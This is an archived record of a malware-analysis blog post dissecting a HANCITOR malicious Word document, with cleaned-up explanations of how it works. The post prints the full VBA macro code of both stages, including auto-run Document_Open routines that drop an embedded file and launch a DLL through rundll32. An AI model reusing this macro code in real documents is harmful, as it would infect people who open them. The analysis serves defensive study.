{
    "id": "790ab559-e98c-42ba-9574-933e2f6ad5cf",
    "created_at": "2023-01-12T15:05:20.864062Z",
    "updated_at": "2025-03-27T02:09:18.245486Z",
    "deleted_at": null,
    "sha1_hash": "b1897b317edd9598d60912b07bce2b287f3f6011",
    "title": "2021-11-23 - HANCITOR- Analysing The Malicious Document",
    "authors": "",
    "file_creation_date": "2022-05-27T23:24:29Z",
    "file_modification_date": "2022-05-27T23:24:29Z",
    "file_size": 1175781,
    "plain_text": "# HANCITOR: Analysing The Malicious Document\n\n**[0ffset.net/reverse-engineering/malware-analysis/hancitor-maldoc-analysis/](https://www.0ffset.net/reverse-engineering/malware-analysis/hancitor-maldoc-analysis/)**\n\n\nNovember 23, 2021\n\n\n-----\n\n[Chuong Dong](https://www.0ffset.net/author/chuong-dong/)\n23rd November 2021\nNo Comments\n\nHANCITOR (aka CHANITOR) is a prevalent malware loader that spreads through social\nengineering in the form of Word or DocuSign® documents. The infected document includes\ninstructions for the victim to manually allow the malicious macro code to be executed. The\nHANCITOR executable payload dropped by the macro code is used to download other\nmalware on the victim machines such as FickerStealer, Cuba ransomware, Zeppelin\nransomware, and Cobalt Strike beacons.\n\nIn this post particularly, we will analyze the first two stages of a HANCITOR infection through\nWord documents. Similar to other campaigns, the initial stage is delivered through malspam,\nand the final HANCITOR DLL payload is dropped and executed after the victim opens the\ndocument.\n\nTo follow along, you can grab the sample as well as the PCAP files for it on Malware-TrafficAnalysis.net.\n\nSHA256:\n8733E81F7EF203F4D1C4208B75C6AB2548259CC35D68DF10EBF23A31E777871B\n\n## Step 1: Dumping First Stage Macros\n\n\n-----\n\nUpon opening the document in Word, we can see an image directing us to click on the\n“Enable editing” and “Enable content” buttons with a security alert saying that macros have\nbeen disabled. This hints to us that this document contains some macro code that will be\nexecuted when we click to enable macro.\n\n[We can use olevba to quickly dump and analyze the document’s macro code. As shown](https://github.com/decalage2/oletools)\nbelow, the tool identifies the Document_Open function with type AutoExec, which is\nexecuted if the victim presses the “Enable content” button. There are other suspicious\ncommands to execute other files on the system, so we can analyze the VBA code to\nexamine its full functionalities.\n\nBelow is the full VBA macros dumped from olevba.\n\n\n-----\n\nStage 1 Macro Code Dump\n——————————————————————————\nVBA MACRO ThisDocument.cls\n\nin file: 0929_966655534820.doc – OLE stream: ‘Macros/VBA/ThisDocument’\n\n– – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – –\n\nOption Explicit\n\nOption Compare Text\n\nDim nccx As String\n\nDim vssfs As String\n\nPrivate Sub Document_Open()\n\nDim dfgdgdg\n\nCall s1(“Lo”)\n\nDim fds, fdsa As String\n\nfds = “\\”\n\nfdsa = “.d”\n\nCall s2(“cal/”)\n\nCall ass\n\nCall acc\n\nDim kytrewwf As String\n\nkytrewwf = Options.DefaultFilePath(wdUserTemplatesPath)\n\nIf Dir(kytrewwf & fds & “zoro” & fdsa & vssfs) = “” Then\n\nDim mySum\n\nmySum = Application.Run(“bvxfcsd”)\n\nIf Len(nccx) > 2 Then\n\nCall nam(nccx, kytrewwf)\n\n\n-----\n\nCall pppx(kytrewwf & fds & zoro & fdsa & vssfs)\n\nEnd If\n\nEnd If\n\nEnd Sub\n\nSub ass()\n\nvssfs = “o”\n\nEnd Sub\n\nSub acc()\n\nvssfs = vssfs & “c”\n\nEnd Sub\n\nSub hdhdd(asda As String)\n\nDim MyFSO As FileSystemObject\n\nDim MyFile As File\n\nDim SourceFolder As String\n\nDim DestinationFolder As String\n\nDim MyFolder As Folder\n\nDim MySubFolder As Folder\n\nSet MyFSO = New Scripting.FileSystemObject\n\nCall Search(MyFSO.GetFolder(asda), nccx)\n\nEnd Sub\n\n——————————————————————————\nVBA MACRO Module1.bas\n\nin file: 0929_966655534820.doc – OLE stream: ‘Macros/VBA/Module1’\n\n– – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – –\n\nSub pppx(pili As String)\n\n\n-----\n\nDocuments.Open FileName:=pili, ConfirmConversions:=False, ReadOnly:= _\n\nFalse, AddToRecentFiles:=False,\nPasswordDocument:=”doyouknowthatthegodsofdeathonlyeatapples?”, _\n\nPasswordTemplate:=””, Revert:=False, WritePasswordDocument:=””, _\n\nWritePasswordTemplate:=””, Format:=wdOpenFormatAuto, XMLTransform:=””\n\nEnd Sub\n\n——————————————————————————\nVBA MACRO Module3.bas\n\nin file: 0929_966655534820.doc – OLE stream: ‘Macros/VBA/Module3’\n\n– – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – –\n\nDim mgf, uhjknb, wers, qweds, fafaa As String\n\nSub s1(vi As String)\n\nmgf = vi\n\nEnd Sub\n\nSub s2(vi As String)\n\nuhjknb = vi\n\nEnd Sub\n\nSub s3(vi As String)\n\nwers = vi\n\nEnd Sub\n\nSub bvxfcsd()\n\nwers = “T” & “e”\n\nSelection.MoveDown Unit:=wdLine, Count:=3\n\nSelection.MoveRight Unit:=wdCharacter, Count:=2\n\nSelection.MoveDown Unit:=wdLine, Count:=3\n\n\n-----\n\nSelection.MoveRight Unit:=wdCharacter, Count:=2\n\nSelection.TypeBackspace\n\nSelection.Copy\n\nDim uuuuc\n\nuuuuc = Options.DefaultFilePath(wdUserTemplatesPath)\n\nntgs = 50\n\nsda = 49\n\nDim poidds As String\n\nqweds = “m” & “p”\n\nDim kuls As String\n\npoidds = mgf & uhjknb & wers & qweds\n\nfafaa = poidds\n\nWhile sda < 50\n\nntgs = ntgs – 1\n\nIf Dir(Left(uuuuc, ntgs) & fafaa, vbDirectory) = “” Then\n\nElse\n\nsda = 61\n\nEnd If\n\nWend\n\nCall ThisDocument.hdhdd(Left(uuuuc, ntgs) & fafaa)\n\nEnd Sub\n\n——————————————————————————\nVBA MACRO Module123345.bas\n\nin file: 0929_966655534820.doc – OLE stream: ‘Macros/VBA/Module123345’\n\n– – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – –\n\n\n-----\n\nDim pls As String\n\nSub Search(mds As Object, pafs As String)\n\nDim Nedc As Object\n\nDim Ters As Object\n\nFor Each Nedc In mds.SubFolders\n\nSearch Nedc, pafs\n\nNext Nedc\n\nFor Each Ters In mds.Files\n\nIf Ters.Name = “zoro.kl” Then\n\npafs = Ters\n\nEnd If\n\nNext Ters\n\nExit Sub\n\nErrHandle:\n\nErr.Clear\n\nEnd Sub\n\nSub nam(pafs As String, aaaa As String)\n\nCall ousx(aaaa)\n\nDim oxl\n\noxl = “\\zoro.d”\n\noxl = oxl & “oc”\n\nName pafs As pls & oxl\n\nEnd Sub\n\nSub uoia(fffs As String)\n\npls = fffs\n\n\n-----\n\nEnd Sub\n\nSub ousx(aaaa As String)\n\nCall uoia(aaaa)\n\nEnd Sub\n\n## Step 2: Analyzing First Stage Macros\n\nThe Document_Open function is a special function that gets executed when the document\nis opened, so it is definitely a good starting point for us to begin analyzing. The raw\n**Document_Open function is documented below.**\n```\nPrivate Sub Document_Open()\n  Dim dfgdgdg\n  Call s1(\"Lo\")\n  Dim fds, fdsa As String\n  fds = \"\\\"\n  fdsa = \".d\"\n  Call s2(\"cal/\")\n  Call ass\n  Call acc\n  Dim kytrewwf As String\n  kytrewwf = Options.DefaultFilePath(wdUserTemplatesPath)\n  If Dir(kytrewwf & fds & \"zoro\" & fdsa & vssfs) = \"\" Then\n    Dim mySum\n    mySum = Application.Run(\"bvxfcsd\")\n    If Len(nccx) > 2 Then\n      Call nam(nccx, kytrewwf)\n      Call pppx(kytrewwf & fds & \"zoro\" & fdsa & vssfs)\n    End If\n  End If\nEnd Sub\n\n```\nMost of the variable declarations and function calls are just simple obfuscation techniques,\nwhich are used to break down strings and hide them from being dumped directly from the\nWord document. If we resolve these and replace the variables with their content, the first IF\nstatement becomes a check to see if the “zoro.doc” file in the user template path exists.\n```\nIf Dir(kytrewwf & \"\\\" & \"zoro\" & \".d\" & \"oc\") = \"\" Then\n\n```\nIf it doesn’t exist, the macros calls the Application.Run method to execute the function\n**bvxfcsd. Below is the cleaned up version of this function’s code.**\n\n\n-----\n\n```\nSub bvxfcsd()\n  Selection.MoveDown Unit:=wdLine, Count:=3\n  Selection.MoveRight Unit:=wdCharacter, Count:=2\n  Selection.MoveDown Unit:=wdLine, Count:=3\n  Selection.MoveRight Unit:=wdCharacter, Count:=2\n  Selection.TypeBackspace\n  Selection.Copy\n  Dim uuuuc\n  uuuuc = Options.DefaultFilePath(wdUserTemplatesPath)\n  ntgs = 50\n  sda = 49\n  While sda < 50\n    ntgs = ntgs - 1\n    If Dir(Left(uuuuc, ntgs) & \"Local/Temp\", vbDirectory) = \"\" Then\n    Else\n      sda = 61\n    End If\n  Wend\n  Call ThisDocument.hdhdd(Left(uuuuc, ntgs) & \"Local/Temp\")\nEnd Sub\n\n```\nThe first thing we see is a set of calls executing methods from the Selection property. Since\nthe cursor points to the beginning of the document initially, these calls move it down 3 lines,\nright 2 characters, down 3 lines, right 2 characters, and delete one character from the cursor.\n\nThis block of code might seem harmless, but it is an effective way to manually drop VBA\nobjects into the file system. If we move the cursor according to the steps above, we see that\nthe cursor stops at a visible but small black box that isn’t there initially.\n\n\n-----\n\nThis black box represents a VBA object embedded in the document, and once interacted by\nthe victim or the VBA macros, the object is automatically dropped to the file system.\nInteractions that trigger this include copying the object, which is invoked when the macros\ncalls the function Selection.Copy.\n\nMicrosoft documents [here that embedded Word Objects are stored as temporary files in the](https://support.microsoft.com/en-us/topic/description-of-how-word-creates-temporary-files-66b112fb-d2c0-8f40-a0be-70a367cc4c85#:~:text=A%20temporary%20file%20is%20a,needs%20to%20create%20temporary%20files.)\n**Temp directory for the document to interact with if needed. Therefore, we know that this**\nobject, whatever it is, is dropped somewhere in the victim’s Temp directory.\n\nWe can go further and examine the object’s properties to find the exact path of it.\n\n\n-----\n\nAs shown, the object is dropped to the file zoro.kl in the folder {90224AF4-616C-4FE4**9467-D6BA4B34E24E} inside the Temp directory of my analysis VM. This is in fact the**\nsecond stage Word document that is later launched in the code, but we will keep analyzing\nthe VBA macros to see how the code interacts with it.\n\nAfter dropping this file, the function loops to find the path to the Local\\Temp directory that is\nvalid and calls the function hdhdd with the Temp directory path as parameter. Below is the\ncontent of that function.\n```\nSub hdhdd(asda As String)\n  Dim MyFSO As FileSystemObject\n  Dim MyFile As File\n  Dim SourceFolder As String\n  Dim DestinationFolder As String\n  Dim MyFolder As Folder\n  Dim MySubFolder As Folder\n  Set MyFSO = New Scripting.FileSystemObject\n  Call Search(MyFSO.GetFolder(asda), nccx)\nEnd Sub\n\n```\n\n-----\n\nThis function basically just retrieves the folder object for the path from its parameter, which is\nthe Temp path, and calls the Search function. Below is the cleaned up version of the\nfunction’s content.\n```\nSub Search(in_dirpath As Object, out_string As String)\n  Dim subfolder As Object\n  Dim fileobject As Object\n  For Each subfolder In mds.SubFolders\n    Search subfolder, in_dirpath\n  Next subfolder\n  For Each fileobject In in_dirpath.Files\n    If fileobject.Name = \"zoro.kl\" Then\n      out_string = fileobject\n    End If\n  Next fileobject\nExit Sub\nErrHandle:  \n  Err.Clear\nEnd Sub\n\n```\nThe first loop of this function iterates through all subfolders in the Temp path. For each of\nthose subfolders, the function recursively calls itself to search in that subfolder. At the base\ncase of the recursion where there are no more subfolders in the current folder, the code\niterates through all file objects and checks if its name is zoro.kl.\n\nOnce found, the code sets the second parameter to this file object. Ultimately, this Search\ncall recursively searches for the zoro.kl file that is dropped earlier and sets the global\nvariable nccx to the file path.\n\nAfter this part, the code picks up back in the Document_Open function where the final IF\nstatement checks if the length of nccx (the zoro.kl file path) is longer than 2. It then calls the\nfunction nam passing the file path and the user template path respectively. Below is the\ncleaned up version of this function.\n```\nSub nam(zoro_kl_file_path As String, user_template_path As String)\n  Dim oxl\n  oxl = \"\\zoro.doc\"\n  Name zoro_kl_file_path As user_template_path & oxl\nEnd Sub\n\n```\nThis function executes the VBA Name statement to rename the zoro.kl file in the Temp\nfolder to zoro.doc and move it to the user template folder.\n\nThe final call in Document_Open is to the function pppx with the full path to the zoro.doc\nfile as parameter. Below is the content of that function.\n\n\n-----\n\n```\nSub pppx(pili As String)\n  Documents.Open FileName:=pili, ConfirmConversions:=False, ReadOnly:= _\n    False, AddToRecentFiles:=False,\nPasswordDocument:=\"doyouknowthatthegodsofdeathonlyeatapples?\", _\n    PasswordTemplate:=\"\", Revert:=False, WritePasswordDocument:=\"\", _\n    WritePasswordTemplate:=\"\", Format:=wdOpenFormatAuto, XMLTransform:=\"\"\nEnd Sub\n\n```\nThis function executes the Documents.Open method to openthe zoro.doc file. A different\nthing about this newly dropped document is that it comes with the password\n**“doyouknowthatthegodsofdeathonlyeatapples?”, which is used to open and execute the**\nmacro code inside.\n\n## Step 3: Dumping Stage 2 Macros\n\nSimilar to the first stage, the second stage document contains some macro code that can be\ndumped by olevba. However, the default olevba command does not work for this document\nand throws an error that the document can not be decrypted.\n\nSince the document is encrypted with the password we see in the earlier stage, we must\nprovide that in the olevba command to decrypt the document before dumping its macro\ncode.\n```\nolevba zoro.doc -p doyouknowthatthegodsofdeathonlyeatapples?\n\n```\nAs shown from the olevba result below, the document’s macros contain a Document_Open\nfunction with type AutoExec as well as the functionality to run an executable file.\n\nThe content of the macros is recorded below.\n\n\n-----\n\nStage 2 Macro Code Dump\n——————————————————————————\nVBA MACRO ThisDocument.cls\n\nin file: word/vbaProject.bin – OLE stream: ‘VBA/ThisDocument’\n\n– – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – –\n\nOption Explicit\n\nOption Compare Text\n\nDim hdv As String\n\nDim bbbb As String\n\nDim med As String\n\nPrivate Sub Document_Open()\n\nDim vcbc As String\n\nDim dfgdgdg\n\nbbbb = “ru” & “ndl”\n\nvcbc = Options.DefaultFilePath(wdUserTemplatesPath)\n\nIf Dir(vcbc & “\\gelforr.dap”) = “” Then\n\nSelection.MoveDown Unit:=wdLine, Count:=3\n\nSelection.MoveRight Unit:=wdCharacter, Count:=2\n\nSelection.MoveDown Unit:=wdLine, Count:=3\n\nSelection.MoveRight Unit:=wdCharacter, Count:=2\n\nSelection.TypeBackspace\n\nSelection.Copy\n\nCall bvxfcsd\n\nIf Len(hdv) > 2 Then\n\nCall nam(hdv)\n\n\n-----\n\nDim pattison\n\npattison = “\\gelforr.dap”\n\nDim cvzz As String\n\ncvzz = “l3” & “2.exe”\n\nShell (bbbb & cvzz & ” ” & vcbc & pattison & “,BNJAFSRSQIX”)\n\nActiveDocument.Close\n\nEnd If\n\nEnd If\n\nEnd Sub\n\nSub hdhdd(asda As String)\n\nDim MyFSO As FileSystemObject\n\nDim MyFile As File\n\nDim SourceFolder As String\n\nDim DestinationFolder As String\n\nDim MyFolder As Folder\n\nDim MySubFolder As Folder\n\nSet MyFSO = New Scripting.FileSystemObject\n\nCall Search(MyFSO.GetFolder(asda), hdv)\n\nEnd Sub\n\n——————————————————————————\nVBA MACRO Module1.bas\n\nin file: word/vbaProject.bin – OLE stream: ‘VBA/Module1’\n\n– – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – –\n\nDim pls As String\n\nSub nam(pafs As String)\n\n\n-----\n\nCall ousx\n\nDim oxl\n\noxl = “\\gelforr.dap”\n\nName pafs As pls & oxl\n\nEnd Sub\n\nSub ousx()\n\nCall uoia(Options.DefaultFilePath(wdUserTemplatesPath))\n\nEnd Sub\n\nSub Search(mds As Object, pafs As String)\n\nDim Nedc As Object\n\nDim fffff\n\nfffff = “gelfor.dap”\n\nFor Each Nedc In mds.SubFolders\n\nSearch Nedc, pafs\n\nNext Nedc\n\nDim Ters As Object\n\nFor Each Ters In mds.Files\n\nIf Ters.Name = fffff Then\n\npafs = Ters\n\nEnd If\n\nNext Ters\n\nExit Sub\n\nErrHandle:\n\nErr.Clear\n\nEnd Sub\n\n\n-----\n\nSub uoia(fffs As String)\n\npls = fffs\n\nEnd Sub\n\n——————————————————————————\nVBA MACRO Module3.bas\n\nin file: word/vbaProject.bin – OLE stream: ‘VBA/Module3’\n\n– – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – – –\n\nSub bvxfcsd()\n\nDim uuuuc\n\nuuuuc = Options.DefaultFilePath(wdUserTemplatesPath)\n\nDim ewrwsdf As String\n\newrwsdf = “L” & “o”\n\newrwsdf = ewrwsdf & “c” & “a” & “l”\n\newrwsdf = ewrwsdf & “/” & “Temp”\n\nntgs = 50\n\nsda = 49\n\nWhile sda < 50\n\nntgs = ntgs – 1\n\nIf Dir(Left(uuuuc, ntgs) & ewrwsdf, vbDirectory) = “” Then\n\nElse\n\nsda = 61\n\nEnd If\n\nWend\n\nCall ThisDocument.hdhdd(Left(uuuuc, ntgs) & ewrwsdf)\n\nEnd Sub\n\n\n-----\n\n## Step 4: Analyzing Stage 2 Macros\n\nAgain, we begin our analysis at the Document_Open function as it is the entry point of the\ncode.\n\nHere, we can see a similar code pattern to the code in the first stage. It first checks if the\n**gelforr.dap file exists in the user template path, and if it does not, the same methods from**\nthe Selection property are executed to drop the document’s VBA object into the Temp\ndirectory.\n```\nPrivate Sub Document_Open()\n  Dim vcbc As String\n  vcbc = Options.DefaultFilePath(wdUserTemplatesPath)\n  If Dir(vcbc & \"\\gelforr.dap\") = \"\" Then\n    Selection.MoveDown Unit:=wdLine, Count:=3\n    Selection.MoveRight Unit:=wdCharacter, Count:=2\n    Selection.MoveDown Unit:=wdLine, Count:=3\n    Selection.MoveRight Unit:=wdCharacter, Count:=2\n    Selection.TypeBackspace\n    Selection.Copy\n    Call bvxfcsd\n    If Len(hdv) > 2 Then\n      Call nam(hdv)\n      Shell (\"rundl\" & \"l32.exe\" & \" \" & vcbc & \"\\gelforr.dap\" &\n\",BNJAFSRSQIX\")\n      ActiveDocument.Close\n    End If\n  End If\nEnd Sub\n\n```\nNext, the function bvxfcsd is called. As seen below in the code’s cleaned-up version, this\nfunction is a copy of the function bvxfcsd in the first stage, and they both call the function\n**hdhdd to search for the dropped VBA object in the Temp directory. The only difference**\nbetween these stages is the name of the object file being searched, with the second stage’s\ndocument searching for the filename gelfor.dap.\n\n\n-----\n\n```\nSub bvxfcsd()\n  Dim uuuuc\n  uuuuc = Options.DefaultFilePath(wdUserTemplatesPath)\n  ntgs = 50\n  sda = 49\n  While sda < 50\n    ntgs = ntgs - 1\n    If Dir(Left(uuuuc, ntgs) & \"Local/Temp\", vbDirectory) = \"\" Then\n    Else\n      sda = 61\n    End If\n  Wend\n  Call ThisDocument.hdhdd(Left(uuuuc, ntgs) & ewrwsdf)\nEnd Sub\n\n```\nOnce found, the path to the gelfor.dap file is written to the hdv variable, which is then\npassed to the function nam as parameter. Similar to the nam function in the first stage, this\nfunction renames the gelfor.dap file in the Temp path to gelforr.dap and moves it to the\nuser template folder.\n```\nSub nam(pafs As String)\n  Name pafs As pls & \"\\gelforr.dap\"\nEnd Sub\n\n```\nFinally, the code calls the Shell VBA function to execute the following command.\n```\nrundll32.exe <user template path>\\gelforr.dap, BNJAFSRSQIX\n\n```\nFrom this, we know that the dropped VBA object is a DLL file, and the second stage’s\ndocument executes its exported function BNJAFSRSQIX using the rundll32.exe executable.\n\nThe dropped DLL is the final HANCITOR payload that is used to download a Cobalt Strike\nbeacon, and we will be analyzing HANCITOR functionalities using this sample in the next\nblog post!\n\n[If you have any questions regarding the analysis, feel free to reach out to me via Twitter.](https://twitter.com/cPeterr)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-23 - HANCITOR- Analysing The Malicious Document.pdf"
    ],
    "report_names": [
        "2021-11-23 - HANCITOR- Analysing The Malicious Document.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535920,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653693869,
    "ts_modification_date": 1653693869,
    "files": {
        "pdf": "https://archive.orkl.eu/b1897b317edd9598d60912b07bce2b287f3f6011.pdf",
        "text": "https://archive.orkl.eu/b1897b317edd9598d60912b07bce2b287f3f6011.txt",
        "img": "https://archive.orkl.eu/b1897b317edd9598d60912b07bce2b287f3f6011.jpg"
    }
}